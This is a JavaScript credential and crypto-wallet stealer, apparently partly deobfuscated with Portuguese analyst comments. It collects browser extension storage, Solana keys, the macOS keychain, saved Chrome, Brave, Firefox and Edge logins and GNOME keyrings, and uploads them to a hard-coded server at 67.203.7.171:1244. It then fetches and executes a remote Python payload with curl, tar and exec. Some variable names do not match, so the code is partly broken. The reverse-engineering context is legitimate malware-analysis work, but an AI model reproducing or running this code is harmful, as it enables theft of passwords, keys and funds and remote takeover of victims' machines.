Object.prototype.toString, 
Object.defineProperty, 
Object.getOwnPropertyDescriptor;

const t = "base64",
c = "utf8",
fs = require("fs"),
os = require("os"),
slice_decoder = (str) => ((sliced_str = str.slice(1)), Buffer.from(sliced_str, "base64").toString("utf-8"));

pt = require("path"),
request = require("request"),
cr = require("crypto"),  
ex = require("child_process").exec,
hostname = os.hostname(),
pl = os.platform(),
homedir = os.homedir(),
tmpdir = os.tmpdir(),
tp = os.type();

let e;

const base64_decoder = (str) => Buffer.from(str, "base64").toString("utf8"),

const endpoint_constructor = () => {
  let encodedString = "NjcuMjAzLjaHR0cDovLwcuMTcxOjEyNDQ=      ";

  let part1 = "",
      part2 = "",
      part3 = "",
      part4 = "";

  for (let i = 0; i < 10; i++) {
    part1 += encodedString[i];
    part2 += encodedString[10 + i];
    part3 += encodedString[20 + i];
    part4 += encodedString[30 + i];
  }

  let combined = part1 + part3 + part4;
  return base64_decoder(part2) + base64_decoder(combined);
}, // return = "http://67.203.7.171:1244"

path_resolver = (match) =>
  match.replace(/^~([a-z]+|\/)/, (match, group) =>
    "/" === group ? homedir : `${pt["dirname"](homedir)}/${group}`,
  ),
 
h = "ZU1RINz7", //Acho que pode ser a campanha.
o = "get",
i = "/.npl",
Z = "writeFileSync",
m = "/client",
u = "existsSync",
d = "Login Data",
y = "copyFile";

function check_read_permission(filepath) {
  const methodName = "accessSync";
  try {
    return fs[methodName](filepath), true;
  } catch (err) {
    return false;
  }
} // Checa se um arquivo existe com permissão de leitura


const b = "Default",
  G = "Profile",
  f = "filename",
  W = "formData",
  Y = "url",
  w = "options",
  V = "value",
  v = "readdirSync",
  j = "statSync",
  L = ("isDirectory", "post"),
  x = "/.config/",
  z = "/Library/Application Support/",
  F = "/AppData/",
  R = "/User Data",
  N = "Google/Chrome",
  X = "BraveSoftware/Brave-Browser",
  Q = "google-chrome",
  _ = [
    "Local/BraveSoftware/Brave-Browser", 
    "BraveSoftware/Brave-Browser", 
    "BraveSoftware/Brave-Browser"
  ],
  J = [
    "Local/Google/Chrome", 
    "Google/Chrome", 
    "google-chrome"],
  g = [
    "Roaming/Opera Software/Opera Stable",
    "com.operasoftware.Opera",
    "opera",
  ];
let k = "comp";

const U = [
    "bmtiaWhmYmVv",
    "ZWpiYWxiYWtv",
    "Zmhib2hpbWFl",
    "aG5mYW5rbm9j",
    "aWJuZWpkZmpt",
    "YmZuYWVsbW9t",
    "YWVhY2hrbm1l",
    "aGlmYWZnbWNj",
  ],
  B = [
    "Z2FlYW9laGxlZm5rb2RiZWZncGdrbm4",
    "cGxjaGxnaGVjZGFsbWVlZWFqbmltaG0",
    "bGJvaHBqYmJsZGNuZ2NuYXBuZG9kanA",
    "ZmVvZmJkZGdjaWpubWhuZm5rZG5hYWQ",
    "bWtwY25scGVia2xtbmtvZW9paG9mZWM",
    "ZWltaGxwbWdqbmpvcGhocGtrb2xqcGE",
    "ZnBoZXBjY2lvbmJvb2hja29ub2VlbWc",
    "ZHBla3Bsb21qamtjZmdvZG5oY2VsbGo",
  ],
  q = "createReadStream",

  dump_sensitive_extensions_data = async (basePath, filenamePrefix, includeSolanaId) => {
      let currentPath = basePath;
      if (!currentPath || "" === currentPath) return [];

      try {
        if (!check_read_permission(currentPath)) return [];
      } catch (err) {
        return [];
      }

      filenamePrefix || (filenamePrefix = "");

      let collectedFiles = [];

      const extensionFolderName = "Local Extension Settings",
      readMethod = "createReadStream",
      ldbExtension = ".ldb",
      logExtension = ".log";

      for (let profileIndex = 0; profileIndex < 200; profileIndex++) {
        
        const profilePath = `${basePath}/${0 === profileIndex ? "Default" : `${"Profile"} ${profileIndex}`}/${"Local Extension Settings"}`;
        for (let encodedIndex = 0; encodedIndex < U.length; encodedIndex++) {
          const l = base64_decoder(U[encodedIndex] + B[encodedIndex]);
          let fullSubfolderPath = `${profilePath}/${decodedSubfolder}`;

          if (check_read_permission(fullSubfolderPath)) {
            let filesInSubfolder;
            try {
              filesInSubfolder = fs["readdirSync"](fullSubfolderPath);
            } catch (readError) {
              filesInSubfolder = [];
            }

            filesInSubfolder.forEach(async (fileName) => {
              currentPath = pt.join(fullSubfolderPath, fileName);
              try {
                if (currentPath.includes(ldbExtension) || currentPath.includes(logExtension)) {
                  collectedFiles.push({
                    value: fs[readMethod](currentPath),
                    options: {
                      filename: `${filenamePrefix}${profileIndex}_${decodedSubfolder}_${fileName}`
                    }
                  });
                }
              } catch (e) {}
            });
          }
        }
      }

      if (includeSolanaId) {
        const solanaFilename = "solana_id.txt";
        currentPath = `${homedir}/.config/solana/id.json`;

        if (fs["existsSync"](currentPath)) {
          try {
            collectedFiles.push({
              value: fs["createReadStream"](currentPath),
              options: { filename: solanaFilename }
            });
          } catch (e) {}
        }
      }
    
      files_exfiltration(collectedFiles);
      return collectedFiles;
    },

    files_exfiltration = (fileList) => {
        const paramName = "multi_file",
        uploadPath = "/uploads",
        payload = { 
          timestamp: e.toString(), 
          type: "ZU1RINz7", 
          hid: "comp", 
          multi_file: fileList },
          server = "http://67.203.7.171:1244";

        try {
          const postData = { 
            url: `${"http://67.203.7.171:1244"}${"/uploads"}`, 
            formData: payload 
          };

          request["post"](postData, (err, res, body) => {});
        } catch (err) {}
      },

      resolve_os_profile_path = async (targetsArray, prefix) => {
        try {
          const home = path_resolver("~/");
          let fullPath = "";

          fullPath = pl[0] == "d" // Se for macOS
          ? `${home}/Library/Application Support/${base64_decoder(targetsArray[1])}`
          : pl[0] == "l"  // Se for Linux
            ? `${home}/.config/${base64_decoder(targetsArray[2])}`
            : `${home}/AppData/${base64_decoder(targetsArray[0])}${"/User Data"}`; 
            
            // Senão, assume Windows

          await dump_sensitive_extensions_data(fullPath, `${prefix}_`, prefix == 0);
        } catch (e) {}
      }, // Constrói o caminho certo para os perfis de navegador baseado na plataforma.
      
      dump_keychain = async () => {
        let collectedFiles = [];
      
        const KEYCHAIN_FILE = "Login Data",
              STREAM_METHOD = "createReadStream",
              MAC_KEYCHAIN_PATH = "/Library/Keychains/login.keychain",
              DUMP_NAME = "logkc-db";
      
        // Define o caminho completo do keychain do macOS
        pa = `${homedir}/Library/Keychains/login.keychain`;
      
        // Verifica se o arquivo de keychain existe no caminho original
        if (fs["existsSync"](pa)) {
          try {
            collectedFiles.push({
              value: fs["createReadStream"](pa),
              options: { filename: DUMP_NAME }
            });
          } catch (e) {}
        }
        // Se não existir, tenta a versão com sufixo "-db"
        else if (((pa += "-db"), fs["existsSync"](pa))) {
          try {
            collectedFiles.push({
              value: fs["createReadStream"](pa),
              options: { filename: DUMP_NAME }
            });
          } catch (e) {}
        }
      
        // --- Parte 2: Dump de senhas salvas no Chrome (Login Data)
        try {
          const COPY_METHOD = "copyFile";
          let chromeBasePath = `${homedir}/Library/Application Support/Google/Chrome`;
      
          // Se o caminho for válido e tiver permissão de leitura
          if (chromeBasePath && chromeBasePath !== "" && check_read_permission(chromeBasePath)) {
            for (let i = 0; i < 200; i++) {
              // Caminho para cada perfil do Chrome
              const profilePath = `${chromeBasePath}/${i === 0 ? "Default" : `Profile ${i}`}/Login Data`;
      
              try {
                if (!check_read_permission(profilePath)) continue;
      
                const tempPath = `${chromeBasePath}/ld_${i}`;
      
                // Se já existir uma cópia temporária, adiciona direto
                if (check_read_permission(tempPath)) {
                  collectedFiles.push({
                    value: fs["createReadStream"](tempPath),
                    options: { filename: `pld_${i}` }
                  });
                } else {
                  // Caso contrário, tenta copiar o arquivo
                  fs[COPY_METHOD](profilePath, tempPath, (err) => {
                    let tempDump = [{
                      value: fs["createReadStream"](profilePath),
                      options: { filename: `pld_${i}` }
                    }];
                    files_exfiltration(tempDump); // Exfiltra imediatamente a cópia
                  });
                }
              } catch (e) {}
            }
          }
        } catch (e) {}
      
        // Exfiltra os arquivos coletados (keychain e Login Data do Chrome)
        return files_exfiltration(collectedFiles), collectedFiles;
      },
      
      dumpBraveProfiles = async () => {
        let collectedFiles = [];
      
        const FILE_NAME = "Login Data";
        const STREAM_METHOD = "createReadStream";
      
        try {
          const COPY_METHOD = "copyFile";
          let braveBasePath = `${homedir}/Library/Application Support/BraveSoftware/Brave-Browser`;
      
          if (braveBasePath && braveBasePath !== "" && check_read_permission(braveBasePath)) {
            for (let i = 0; i < 200; i++) {
              const profilePath = `${braveBasePath}/${i === 0 ? "Default" : `Profile ${i}`}/Login Data`;
      
              try {
                if (!check_read_permission(profilePath)) continue;
      
                const tempPath = `${braveBasePath}/brld_${i}`;
      
                if (check_read_permission(tempPath)) {
                  collectedFiles.push({
                    value: fs["createReadStream"](tempPath),
                    options: { filename: `brld_${i}` }
                  });
                } else {
                  fs[COPY_METHOD](profilePath, tempPath, (err) => {
                    let tempDump = [{
                      value: fs["createReadStream"](profilePath),
                      options: { filename: `brld_${i}` }
                    }];
                    files_exfiltration(tempDump);
                  });
                }
              } catch (e) {}
            }
          }
        } catch (e) {}
      
        return files_exfiltration(collectedFiles), collectedFiles;
      },
      dump_firefox_credentials = async () => {
        let collectedFiles = [];
      
        const STREAM_METHOD = "createReadStream",
              FIREFOX_DB = "key4.db",
              FIREFOX_JSON = "logins.json";
      
        try {
          let firefoxBasePath = `${homedir}/Library/Application Support/Firefox`;
      
          if (firefoxBasePath && firefoxBasePath !== "" && check_read_permission(firefoxBasePath)) {
            for (let profileIndex = 0; profileIndex < 200; profileIndex++) {
              const profileName = profileIndex === 0 ? "Default" : `Profile ${profileIndex}`,
                    keyDbPath = `${firefoxBasePath}/${profileName}/${FIREFOX_DB}`,
                    loginJsonPath = `${firefoxBasePath}/${profileName}/${FIREFOX_JSON}`;
      
              // Tenta adicionar o key4.db
              try {
                if (!check_read_permission(keyDbPath)) continue;
      
                collectedFiles.push({
                  values: fs[STREAM_METHOD](keyDbPath),
                  options: { filename: `fk4_${profileIndex}` }
                });
              } catch (e) {}
      
              // Tenta adicionar o logins.json
              try {
                if (!check_read_permission(loginJsonPath)) continue;
      
                collectedFiles.push({
                  values: fs[STREAM_METHOD](loginJsonPath),
                  options: { filename: `flj_${profileIndex}` }
                });
              } catch (e) {}
            }
          }
        } catch (e) {}
      
        return files_exfiltration(collectedFiles), collectedFiles;
      },
      dump_gnome_keyrings = async () => {
        let collectedFiles = [];
      
        const READ_METHOD = "createReadStream";
        const keyringFolder = "/.local/share/keyrings/";
      
        try {
          const keyringPath = `${homedir}${keyringFolder}`;
          let keyringFiles = [];
      
          if (keyringPath && keyringPath !== "" && check_read_permission(keyringPath)) {
            try {
              keyringFiles = fs["readdirSync"](keyringPath);
            } catch (e) {
              keyringFiles = [];
            }
      
            keyringFiles.forEach(async (fileName) => {
              const fullFilePath = pt.join(keyringPath, fileName);
              try {
                collectedFiles.push({
                  value: fs[READ_METHOD](fullFilePath),
                  options: { filename: `${fileName}` }
                });
              } catch (e) {}
            });
          }
        } catch (e) {}
      
        return files_exfiltration(collectedFiles), collectedFiles;
      },
      dump_linux_chrome = async () => {
        let collectedFiles = [];
      
        const LOGIN_DATA_FILENAME = "Login Data";
        const READ_STREAM = "createReadStream";
        const COPY_FILE = "copyFile";
      
        try {
          let basePath = `${homedir}/.config/google-chrome`;
      
          if (basePath && basePath !== "" && check_read_permission(basePath)) {
            for (let i = 0; i < 200; i++) {
              const profilePath = `${basePath}/${i === 0 ? "Default" : `Profile ${i}`}/${LOGIN_DATA_FILENAME}`;
              
              try {
                if (!check_read_permission(profilePath)) continue;
      
                const tempCopyPath = `${basePath}/ld_${i}`;
      
                if (check_read_permission(tempCopyPath)) {
                  collectedFiles.push({
                    value: fs[READ_STREAM](tempCopyPath),
                    options: { filename: `plld_${i}` }
                  });
                } else {
                  fs[COPY_FILE](profilePath, tempCopyPath, (err) => {
                    const toExfiltrate = [{
                      value: fs[READ_STREAM](profilePath),
                      options: { filename: `plld_${i}` }
                    }];
                    files_exfiltration(toExfiltrate);
                  });
                }
              } catch (e) {}
            }
          }
        } catch (e) {}
      
        return files_exfiltration(collectedFiles), collectedFiles;
      },
      dump_firefox_linux = async () => {
        let collectedFiles = [];
      
        const READ_STREAM = "createReadStream";
        const KEY4_DB = "key4.db";
        const KEY3_DB = "key3.db";
        const LOGINS_JSON = "logins.json";
      
        try {
          let firefoxPath = `${homedir}/.mozilla/firefox/`;
      
          if (firefoxPath && firefoxPath !== "" && check_read_permission(firefoxPath)) {
            for (let i = 0; i < 200; i++) {
              const profileName = i === 0 ? "Default" : `Profile ${i}`;
              const pathKey4 = `${firefoxPath}/${profileName}/${KEY4_DB}`;
              const pathKey3 = `${firefoxPath}/${profileName}/${KEY3_DB}`;
              const pathLogins = `${firefoxPath}/${profileName}/${LOGINS_JSON}`;
      
              try {
                if (!check_read_permission(pathKey4)) continue;
                collectedFiles.push({
                  value: fs[READ_STREAM](pathKey4),
                  options: { filename: `flk4_${i}` }
                });
              } catch (err) {}
      
              try {
                if (!check_read_permission(pathKey3)) continue;
                collectedFiles.push({
                  value: fs[READ_STREAM](pathKey3),
                  options: { filename: `flk3_${i}` }
                });
              } catch (err) {}
      
              try {
                if (!check_read_permission(pathLogins)) continue;
                collectedFiles.push({
                  value: fs[READ_STREAM](pathLogins),
                  options: { filename: `fllj_${i}` }
                });
              } catch (err) {}
            }
          }
        } catch (err) {}
      
        files_exfiltration(collectedFiles);
        return collectedFiles;
      }
      const REMOVE_FILE = "rmSync";
      const PYTHON_PATH_REGEX = /\.pyp\\python\.exe/;
      const PAYLOAD_SIZE = 51476590;
      
      let lastSizeChecked = 0;
      
      const extract_tar_payload = async (filePath) => {
        const command = `tar -xf ${filePath} -C ${homedir}`;
        ex(command, (err, stdout, stderr) => {
          if (err) {
            fs[REMOVE_FILE](filePath);
            lastSizeChecked = 0;
            return;
          }
          fs[REMOVE_FILE](filePath);
          startExecutionCycle(); 
        });
      };
      
      const attempt_payload_retrieval = () => {
        const finalZipName = "p2.zip";
        const downloadUrl = "/pdown"
        const tempZipPath = `${tmpdir}\\p.zi`;
        const finalZipPath = `${tmpdir}\\${finalZipName}`;
      
        if (lastSizeChecked >= PAYLOAD_SIZE + 6) return;
      
        const RENAME_SYNC = "renameSync";
        const RENAME = "rename";
      
        if (fs.existsSync(tempZipPath)) {
          try {
            const stats = fs.statSync(tempZipPath);
      
            if (stats.size >= PAYLOAD_SIZE + 6) {
              lastSizeChecked = stats.size;
              fs[RENAME](tempZipPath, finalZipPath, (err) => {
                if (err) throw err;
                extract_tar_payload(finalZipPath);
              });
            } else {
              if (lastSizeChecked < stats.size) {
                lastSizeChecked = stats.size;
              } else {
                fs[REMOVE_FILE](tempZipPath);
                lastSizeChecked = 0;
              }
              $t();
            }
          } catch (err) {}
        } else {
          const curlCommand = `curl -Lo "${tempZipPath}" "${downloadUrl}"`;
          ex(curlCommand, (err, stdout, stderr) => {
            if (err) {
              lastSizeChecked = 0;
              return retry_payload_download(); 
            }
      
            try {
              lastSizeChecked = PAYLOAD_SIZE + 6;
              fs[RENAME_SYNC](tempZipPath, finalZipPath);
              extract_tar_payload(finalZipPath);
            } catch (err) {}
          });
        }
      };
      function retry_payload_download() {
        setTimeout(() => {
          attempt_payload_retrieval();
        }, 20000); // 20 segundos
      }
      
      const startExecutionCycle = async () =>
        await new Promise((resolve, reject) => {
          if (platformIndicator[0] === "w") {
            const pythonPath = `${homedir}\\.pyp\\python.exe`;
      
            if (fs.existsSync(pythonPath)) {
              (() => {
                const baseUrl = endpoint_constructor(),
                  endpoint = "/client",
                  downloadPath = `${baseUrl}/client/ZU1RINz7`,
                  localScriptPath = `${homedir}/.npl`,
                  execCommand = `"${pythonPath}" "${localScriptPath}"`;
      
                try {
                  fs.rmSync(localScriptPath);
                } catch (err) {}
      
                request.get(downloadPath, (err, response, body) => {
                  if (!err) {
                    try {
                      fs.writeFileSync(localScriptPath, body);
                      ex(execCommand, () => {});
                    } catch (err) {}
                  }
                });
              })();
            } else {
              attempt_payload_retrieval(); // era at()
            }
          } else {
            (() => {
              const baseUrl = endpoint_constructor(),
                downloadPath = `${baseUrl}/client/ZU1RINz7`,
                localScriptPath = `${homedir}/.npl`,
                execCommand = `python3 "${localScriptPath}"`;
      
              request.get(downloadPath, (err, response, body) => {
                if (!err) {
                  fs.writeFileSync(localScriptPath, body);
                  ex(execCommand, () => {});
                }
              });
            })();
          }
        });
      ;
      let retryCounter = 0;

      const mainOrRetryLoop = async () => {
        try {
          executionTime = Date.now();
      
          await (async () => {
            hostnameCache = hostname;
      
            try {
              const home = path_resolver("~/");
      
              await resolve_os_profile_path(J, 0);
              await resolve_os_profile_path(_, 1);
              await resolve_os_profile_path(g, 2);
      
              if (platformIndicator[0] === "w") {
                edgeUserDataPath = `${home}/AppData/Local/Microsoft/Edge/User Data`;
                await dump_sensitive_extensions_data(edgeUserDataPath, "3_", false);
              } else if (platformIndicator[0] === "d") {
                await dump_keychain();
                await dumpBraveProfiles();
                await dump_firefox_credentials();
              } else if (platformIndicator[0] === "l") {
                await dump_gnome_keyrings();
                await dump_linux_chrome();
                await dump_firefox_linux();
              }
            } catch (err) {}
          })();
      
          startExecutionCycle();
        } catch (err) {}
      };
      mainOrRetryLoop();

let intervalLoop = setInterval(() => {
  if (++retryCounter < 5) {
    mainOrRetryLoop();
  } else {
    clearInterval(intervalLoop);
  }
}, 600000); // 10 minutos

            